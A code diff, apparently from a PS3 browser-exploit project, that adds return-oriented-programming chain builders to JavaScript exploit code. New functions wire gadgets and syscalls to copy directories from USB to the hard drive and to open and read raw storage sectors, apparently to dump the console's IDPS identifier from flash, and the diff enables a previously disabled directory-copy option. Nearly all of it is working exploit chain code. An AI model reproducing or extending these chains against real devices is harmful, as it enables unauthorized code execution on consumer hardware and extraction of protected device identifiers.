@@ -1036,6 +1036,62 @@ function syscallReadWriteFileAuto(src,dest)
 	//a33_jumpto=g_exit_chain;
 }
 
+function syscallReadWriteDirectory(src,dest)
+{
+	// Open Source Directory
+	a1_r3=src;
+	a1_r4=sc_opendir_fd;
+	a1_jumpto=g_set_r4_thru_r11;
+	a2_jumpto=g_set_r3_from_r29;
+	a3_jumpto=g_sc_A0;
+	
+	// Create Target Directory
+	a4_r3=dest;
+	a4_r4=sc_fs_mode;
+	a4_r11=sc_sys_fs_mkdir;
+	a4_jumpto=g_set_r4_thru_r11;
+	a5_jumpto=g_set_r3_from_r29;
+	a6_jumpto=g_sc_A0;
+	
+	// Read Source Directory From File Descriptor
+	a7_r3=sc_opendir_fd;
+	a7_r4=sc_opendir_path;
+	a7_r5=sc_readdir_nread;
+	a7_r9=sc_opendir_fd;
+	a7_r11=sys_fs_readdir;
+	a7_jumpto=g_set_r4_thru_r11;
+	a8_jumpto=g_set_r3_from_r29;
+	a9_jumpto=g_sc_set_r3_from_r9;
+	
+	a10_r3=hdd_fp_addr;
+	a10_r8=write_buf;// register is r4
+	a10_r10=0;// register is r5
+	extra2=write_nwrite;// register is r6
+	a10_r6=hdd_fp_addr;// register is r9
+	extra5=g_set_r4_thru_r11;
+	extra1=g_set_r3_from_r29;
+	extra3=g_sc_set_r3_from_r9;
+	extra4=sc_sys_fs_write;// register is r11
+	a13_r30=g_set_r31_F8;// must change r31 to not get base_fp overwritten
+	a15_r10=usb_fp_addr;
+	a15_r11=sc_sys_fs_close;
+	a16_jumpto=g_set_r4_thru_r11;
+	a15_jumpto=g_sc_set_r3_from_r10;// using gadget 15 spot in chain
+	a17_jumpto=g_set_r4_thru_r11;
+	a18_jumpto=g_sc_A0
+	a19_jumpto=g_set_r31_108;
+	a20_r10=sc_sys_fs_close;// register is r11
+	a21_r10=hdd_fp_addr;
+	a20_jumpto=g_set_r4_thru_r11;
+	a22_jumpto=g_sc_set_r3_from_r10;
+	
+	a21_jumpto=g_set_r4_thru_r11;
+	a23_jumpto=g_set_r4_thru_r11;
+	a24_r11=restore_stack;
+	a24_jumpto=g_exit_chain;
+	a25_r11=restore_stack;
+}
+
 function exportStdcOpenReadCloseDir(src)
 {
 	a1_r3=src;
@@ -1104,6 +1160,43 @@ function callExportAndExit(r3,r4,r5,r6,r7,r8,r9,r10,r11,r30,r31,export_addr)
 	a4_r11=restore_stack;
 	a4_jumpto=g_set_r4_thru_r11;
 	a5_jumpto=g_exit_chain;
+}
+
+function openReadDeviceAndExit(device_id,src,dest)
+{
+	a1_r4=sc_sso_mode;
+	a1_r5=fd_addr;
+	a1_r6=sc_sso_flags;
+	a1_r9=magic_addr;// pointer to load next gadget into r0
+	a1_r11=sc_sys_storage_open;
+	a1_jumpto=g_set_r4_thru_r11;
+	extra2=device_flag;
+	extra3=device_id;
+	a2_jumpto=g_set_r3_with_ld;
+	a3_jumpto=g_set_r4_thru_r11;
+	a3_r30=g_set_r3_from_r29;
+	a4_r3=fd_addr;
+	a4_r4=sc_ssr_mode;
+	a4_r5=st_sec;
+	a4_r6=step_sector;
+	a4_r7=temp_addr_8C;
+	a4_r8=fd2_addr;
+	a4_r9=sc_ssr_flags;
+	a4_r11=sc_sys_storage_read;
+	a5_jumpto=g_set_r3_from_r29;
+	a6_r3=fd_addr;
+	a6_r11=sc_sys_storage_close;
+	a6_jumpto=g_set_r4_thru_r11;
+	a7_jumpto=g_set_r3_from_r29;
+	a8_r31=sc_shutdown_soft;
+	a8_jumpto=g_fopen_write_close;
+	a8_r6=sc_shutdown;
+	a8_r29=0x10;
+	a8_r30=temp_addr_8C;
+	a8_jumpto=g_set_r4_thru_r11;
+	a9_r5=0x00000000;
+	a9_r6=0x00000000;
+	a10_r31=g_sc_A0;
 }
 
 function useCustomStackFrame()
@@ -1182,39 +1275,7 @@ function useCustomStackFrame()
 		
 		/*
 		case "dump_idps_from_flash":
-		a1_r4=sc_sso_mode;
-		a1_r5=fd_addr;
-		a1_r6=sc_sso_flags;
-		a1_r9=magic_addr;// pointer to load next gadget into r0
-		a1_r11=sc_sys_storage_open;
-		a1_jumpto=g_set_r4_thru_r11;
-		extra2=device_flag;
-		extra3=device_id;
-		a2_jumpto=g_set_r3_with_ld;
-		a3_jumpto=g_set_r4_thru_r11;
-		a3_r30=g_set_r3_from_r29;
-		a4_r3=fd_addr;
-		a4_r4=sc_ssr_mode;
-		a4_r5=st_sec;
-		a4_r6=step_sector;
-		a4_r7=temp_addr_8C;
-		a4_r8=fd2_addr;
-		a4_r9=sc_ssr_flags;
-		a4_r11=sc_sys_storage_read;
-		a5_jumpto=g_set_r3_from_r29;
-		a6_r3=fd_addr;
-		a6_r11=sc_sys_storage_close;
-		a6_jumpto=g_set_r4_thru_r11;
-		a7_jumpto=g_set_r3_from_r29;
-		a8_r31=sc_shutdown_soft;
-		a8_jumpto=g_fopen_write_close;
-		a8_r6=sc_shutdown;
-		a8_r29=0x10;
-		a8_r30=temp_addr_8C;
-		a8_jumpto=g_set_r4_thru_r11;
-		a9_r5=0x00000000;
-		a9_r6=0x00000000;
-		a10_r31=g_sc_A0;
+		openReadDeviceAndExit(0x4,path_src_fp_addr,path_dest_fp_addr);
 		break;
 		*/
 		
@@ -1227,6 +1288,10 @@ function useCustomStackFrame()
 		{
 			syscallReadWriteFile(path_src_fp_addr,path_dest_fp_addr,file_size);
 		}
+		break;
+		
+		case "dir_read_write_test":
+		syscallReadWriteDirectory(path_src_fp_addr,path_dest_fp_addr);
 		break;
 		
 		case "sys_net_dump":
@@ -1271,10 +1336,6 @@ function useCustomStackFrame()
 		a24_r11=restore_stack;
 		a24_jumpto=g_exit_chain;
 		a25_r11=restore_stack;
-		break;
-		
-		case "dir_read_write_test":
-		exportStdcOpenReadCloseDir(path_src_fp_addr);
 		break;
 		
 		// uses restore_stack1
@@ -1627,8 +1688,8 @@ function setChainOptions(chain)
 		case "dir_read_write_test":
 		setValueToHTML("path_src",usb_dir_ps3xploit);
 		setValueToHTML("path_dest",hdd_dir_ps3xploit);
-		alert(msg_option_not_available);
-		//init_rop.focus();
+		//alert(msg_option_not_available);
+		init_rop.focus();
 		break;
 		
 		case "sys_net_dump":
